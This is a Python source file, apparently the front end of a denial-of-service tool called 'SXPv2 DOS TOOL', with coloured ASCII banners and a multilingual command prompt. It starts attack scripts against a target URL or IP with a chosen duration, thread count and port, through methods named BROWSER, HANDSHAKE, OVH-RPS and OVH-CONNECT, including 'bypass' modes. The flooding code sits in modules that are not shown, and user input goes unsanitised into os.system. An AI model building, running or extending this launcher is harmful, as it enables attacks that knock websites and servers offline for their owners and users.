from attrs import menu_lang,custom_lang, clear_console
import time,os,threading,platform

def type_sender(meth,args):
   a = '> NUL 2>&1'
   if platform.system().lower() == 'linux':
      a = '> /dev/null 2>&1'
   os.system(f'python methods\\{meth}.py {args} %s'%(a))

menu = """               \x1b[38;5;196m╔═╗\x1b[38;5;197m═╗ ╦\x1b[38;5;198m╔═╗\x1b[38;5;40m╔╦╗\x1b[38;5;41m╔═╗\x1b[38;5;42m╔═╗\x1b[38;5;43m╦  \n               \x1b[38;5;196m╚═╗\x1b[38;5;197m╔╩╦╝\x1b[38;5;198m╠═╝ \x1b[38;5;76m║ \x1b[38;5;77m║ ║\x1b[38;5;78m║ ║\x1b[38;5;79m║  \n               \x1b[38;5;196m╚═╝\x1b[38;5;197m╩ ╚═\x1b[38;5;198m╩o  \x1b[38;5;112m╩\x1b[38;5;113m ╚═╝\x1b[38;5;114m╚═╝\x1b[38;5;115m╩═╝\n              \x1b[38;5;196m══╦══════════════════╦══\n    \x1b[38;5;197m╔═══════════╩══════════════════╩═══════════╗╗\n  \x1b[38;5;198m┏┓║         \x1b[38;5;76mWelcome \x1b[38;5;77mTo \x1b[38;5;208mS\x1b[38;5;209mX\x1b[38;5;210mP\x1b[38;5;211mv\x1b[38;5;212m2\x1b[38;5;255m.\x1b[38;5;226mDOS \x1b[38;5;78mTOOL        \x1b[38;5;198m║┏┳┓\n  \x1b[38;5;199m┃┃╚══════════════════════════════════════════╝┃┃┃\n  \x1b[38;5;200m┃┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛┃┃\n\x1b[38;5;201m┏━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┻┳┓\n\x1b[38;5;200m┃\x1b[38;5;226m%s\x1b[38;5;200m┃┃\n\x1b[38;5;199m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻┛\n     \x1b[38;5;21mCopyright \x1b[38;5;57m© \x1b[38;5;93m%s \x1b[38;5;129mSXPv2 \x1b[38;5;165mAll \x1b[38;5;165mRight's \x1b[38;5;201mReserved\x1b[0m"""
meth = '''\x1b[38;5;197m╔════════════════════════════════╦════════════════════════╗\n\x1b[38;5;197m║ \x1b[38;5;76mHTTPS WEBSITE \x1b[38;5;255m[ \x1b[38;5;32mLINK \x1b[38;5;255m& \x1b[38;5;33mIP \x1b[38;5;255m]    \x1b[38;5;197m╠════════════════════════╣\n\x1b[38;5;197m╠════════════════════════════════╣ \x1b[38;5;76mCONNECTION \x1b[38;5;77mATTACK      \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;76m╔═════════════╗                \x1b[38;5;197m║  \x1b[38;5;106mHANDSHAKE             \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;77m║  \x1b[38;5;255mHANDSHAKE  \x1b[38;5;77m║                \x1b[38;5;197m║  \x1b[38;5;107mOVH-CONNECT           \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;78m║   \x1b[38;5;255mBROWSER   \x1b[38;5;78m║                \x1b[38;5;197m║                        \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;79m╚═════════════╝                \x1b[38;5;197m║ \x1b[38;5;161mHALF \x1b[38;5;161mBYPASS            \x1b[38;5;197m║\n\x1b[38;5;197m╠════════════════════════════════╣  \x1b[38;5;124mHTTP-QUERY\x1b[38;5;255m, \x1b[38;5;124mOVH-RPS   \x1b[38;5;197m║\n\x1b[38;5;197m║       \x1b[38;5;76mHTTP WEBSITE \x1b[38;5;255m[ \x1b[38;5;33mIP \x1b[38;5;255m]      \x1b[38;5;197m║  \x1b[38;5;124mBROWSER               \x1b[38;5;197m║\n\x1b[38;5;197m╠════════════════════════════════╣                        \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;76m╔════════════╗ ╔═════════════╗ \x1b[38;5;197m║ \x1b[38;5;226mTOP METHODS USE BY DEV \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;77m║ \x1b[38;5;255mHTTP-QUERY \x1b[38;5;77m║ ║   \x1b[38;5;255mOVH-RPS   \x1b[38;5;77m║ \x1b[38;5;197m║   \x1b[38;5;220mHTTP-QUERY           \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;78m║ \x1b[38;5;255mHTTP-19    \x1b[38;5;78m║ ║ \x1b[38;5;255mOVH-CONNECT \x1b[38;5;78m║ \x1b[38;5;197m║   \x1b[38;5;221mBROWSER              \x1b[38;5;197m║\n\x1b[38;5;197m║ \x1b[38;5;79m╚════════════╝ \x1b[38;5;79m╚═════════════╝ \x1b[38;5;197m║   \x1b[38;5;222mHANDSHAKE            \x1b[38;5;197m║\n\x1b[38;5;197m║                                ╠════════════════════════╣\n\x1b[38;5;197m╚════════════════════════════════╩════════════════════════╝\x1b[0m'''
atk = """                    \x1b[38;5;76m╔═╗═╗ ╦╔═╗  \x1b[38;5;226m┬  ┬┌─┐\n                    \x1b[38;5;77m╚═╗╔╩╦╝╠═╝  \x1b[38;5;227m└┐┌┘┌─┘\n                    \x1b[38;5;78m╚═╝╩ ╚═╩     \x1b[38;5;228m└┘ └─┘     \n           \x1b[38;5;76m█  ╚══╦═══════════════════════╦══╝  █\n           \x1b[38;5;77m╚══╦══╩═[   \x1b[38;5;196mSXPv2 \x1b[38;5;197mDOS\x1b[38;5;255m-\x1b[38;5;198mTOOL  \x1b[38;5;77m]═╩══╦══╝\n\x1b[38;5;78m╔═════════════╣\x1b[38;5;69m%s\x1b[38;5;78m╠═════════════╗\n   \x1b[38;5;160mTARGET \x1b[38;5;255m- \x1b[38;5;208m%s\n  \x1b[38;5;163mMETHODS \x1b[38;5;255m- \x1b[38;5;226m%s\n\x1b[38;5;78m╚═════════════╣       MADE BY HEX1629       ╠═════════════╝\n           \x1b[38;5;77m╔══╩══╦═[   \x1b[38;5;196mSXPv2 \x1b[38;5;197mDOS\x1b[38;5;255m-\x1b[38;5;198mTOOL  \x1b[38;5;77m]═╦══╩══╗\n           \x1b[38;5;76m█   ══╩═══════════════════════╩══   █\n                    \x1b[38;5;78m╔═╗╦ ╔═╦    \x1b[38;5;228m ┌┐ ┌─┐\n                    \x1b[38;5;77m╔═╝╚╦╩╗╠═╗ \x1b[38;5;227m ┌┘└┐└─┐\n                    \x1b[38;5;76m╚═╝═╝ ╩╚═╝  \x1b[38;5;226m┴  ┴└─┘\x1b[0m"""

def format_banner(data):
   return data.replace('\\x1b','\x1b').replace('\\n','\n')

def controler():
    languages = menu_lang()
    print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
    while True:
     try:
        commander = input("\x1b[38;5;76mS\x1b[38;5;77mX\x1b[38;5;78mP\x1b[38;5;255m.\x1b[38;5;226mT\x1b[38;5;227mO\x1b[38;5;228mO\x1b[38;5;229mL \x1b[38;5;196m--> \x1b[0m")
        com = commander.split(' '); a = com[0].replace('!','').upper()
        if a == 'HELP':
           print(format_banner(languages['DISPLAY']['HELP']))
        elif a == 'LANGUAGES':
           c = 0
           if len(com) == 2:
              lang = com[1].upper()
              if lang == 'TH' or lang == 'EN' or lang == 'AR' or lang == 'VN':
                 languages = custom_lang(lang)
                 c = 1
              else:print(f'\x1b[38;5;196m Wrong Languages ( TH, VN, AR, EN ) !')
           else:
              languages = menu_lang()
              c = 1
           if c == 1:print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
        elif a == 'CLS':
           clear_console()
        elif a == 'METH' or a == 'ATTACKS' or a == 'ATK' or a == 'HUB' or a == 'METHOD' or a == 'METHODS':
           print(meth)
        elif a == 'BROWSER' or a == 'المتصفح' or a.encode() == b'TR\xc3\x8cNHDUY\xe1\xbb\x86T' or a == 'เบราว์เซอร์':
           if len(com) == 6:
            target = com[1]
            times = com[2]
            thread = com[3]
            meths = com[4]
            p = com[5]
            threading.Thread(target=type_sender,args=('BROWSER',f'{target} {times} {thread} {meths} {p} command.txt')).start()
            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
           else:print(format_banner(languages['METHODS']['BROWSER']))
        elif a =='HANDSHAKE' or a == 'المصافحة' or a.encode() == b'B\xe1\xba\xaeTTAY' or a == 'เชื่อมต่อ':
           if len(com) == 5:
            target = com[1]
            times = com[2]
            thread = com[3]
            meths = com[4]
            threading.Thread(target=type_sender,args=('HANDSHAKE',f'{target} {times} {thread} {meths}')).start()
            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
           else:print(format_banner(languages['METHODS']['HANDSHAKE']))
        elif a =='OVH-RPS' or a == 'أوفه-آربيس' or a == 'OVHRPS':
           if len(com) == 6:
            target = com[1]
            port = com[2]
            times = com[3]
            thread = com[4]
            booters = com[5]
            threading.Thread(target=type_sender,args=('OVH_RPS',f'{target} {port} {times} {thread} {booters}')).start()
            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
           else:print(format_banner(languages['METHODS']['OVHRPS']))
        elif a =='OVH-CONNECT' or a == 'OVH-الاتصال' or a == 'OVHCONNECT':
           if len(com) == 6:
            target = com[1]
            port = com[2]
            times = com[3]
            thread = com[4]
            booters = com[5]
            threading.Thread(target=type_sender,args=('OVH_CONNECT',f'{target} {port} {times} {thread} {booters}')).start()
            print(atk%(languages['DISPLAY']['ATTACK'],target,a))
           else:print(format_banner(languages['METHODS']['OVHCONNECT']))
        elif a == 'MENU':
           clear_console()
           print(menu%(languages['DISPLAY']['MAIN'],time.ctime().split( )[4]))
        elif a == 'EXIT':
           exit()
        else:print(a.encode())
     except KeyboardInterrupt:exit()
